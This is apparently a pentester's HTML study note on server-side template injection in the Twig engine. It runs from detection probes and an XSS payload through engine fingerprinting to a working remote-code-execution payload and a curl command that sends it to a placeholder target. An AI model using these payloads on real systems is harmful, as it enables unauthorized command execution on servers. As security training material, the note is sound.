<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SSTI Twig Template Engine</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SSTI Twig Template Engine</h1><br/><br /><a href=""><img src="images/2576-1.png" alt="images/2576-1.png" /></a><br /><br />1. Send some test characters to check the response<br />    <a href=""><img src="images/2576-2.png" alt="images/2576-2.png" /></a><br />    <a href=""><img src="images/2576-3.png" alt="images/2576-3.png" /></a><br /><br />2. Try some payloads:<br />    <div class="codebox"><pre>${7*7}<br />{{7*7}}</pre></div><br />    <a href=""><img src="images/2576-4.png" alt="images/2576-4.png" /></a><br />   The mathematical expression is evaluated so is vulnerable to SSTI<br /><br />NOTE: It could be vulnerable also to XSS, because of the vulnerability to SSTI<br />    <div class="codebox"><pre>{{<span style="color:#7f0044;font-weight:400">&lt;svg</span>/<span style="color:#3ad900;font-weight:400">onload=confirm()</span><span style="color:#7f0044;font-weight:400">&gt;</span>}}</pre></div> <br />    <a href=""><img src="images/2576-5.png" alt="images/2576-5.png" /></a><br /><br />3. According to the PortsWigger Diagram(<a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a>)<br />    we are dealing with either a Jinja2 or a Twig template engine<br />    <a href=""><img src="images/2576-6.png" alt="images/2576-6.png" /></a><br />4. There are template engine-specific payloads that we can use to determine which of the two is being utilized. <br />    List of Specific payload for Template Engines:<br />   ◇  PayloadsAllTheThings: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2</a><br />   ◇  HackTricks: <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a><br />   ◇  SecLists: <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt</a>    <br />       Let us try with the below Twig-specific one: <br />       <div class="codebox"><pre>{{_self.env.display(&quot;TEST&quot;)}}</pre></div><br />       <a href=""><img src="images/2576-7.png" alt="images/2576-7.png" /></a><br />       <a href=""><img src="images/2576-8.png" alt="images/2576-8.png" /></a><br />       <div class="codebox"><pre>{{constant(&#39;Twig_Environment::VERSION&#39;)}}</pre></div><br />       <a href=""><img src="images/2576-9.png" alt="images/2576-9.png" /></a><br />       This confirm to us that a Twig template engine is being utilized on the backend. <br /><br />5. RCE <span style="text-decoration:underline;">on Twig</span><br />   Twig has a variable _self, which makes a few of the internal APIs public.<br />   We can use the getFilter function as it allows execution of a user-defined function via the following process:<br />   1) Register a function as a filter callback via <code>registerUndefinedFilterCallback</code><br />   2) Invoke <code>_self.env.getFilter()</code> to execute the function we have just registered<br />   <br />   payload:<br />   <div class="codebox"><pre>{{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;id;uname -a;hostname&quot;)}}</pre></div><br />   cURL request with the payload:<br />   <div class="codebox"><pre>curl -X POST -d &#39;name={{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;id;uname -a;hostname&quot;)}}&#39; http://<span style="color:#7f0044;font-weight:400">&lt;TARGET</span> <span style="color:#333333;font-weight:400">IP</span><span style="color:#7f0044;font-weight:400">&gt;</span>:<span style="color:#7f0044;font-weight:400">&lt;PORT&gt;</span></pre></div><br />   <a href=""><img src="images/2576-10.png" alt="images/2576-10.png" /></a><br /><br /><br /></div>
</body>
</html>
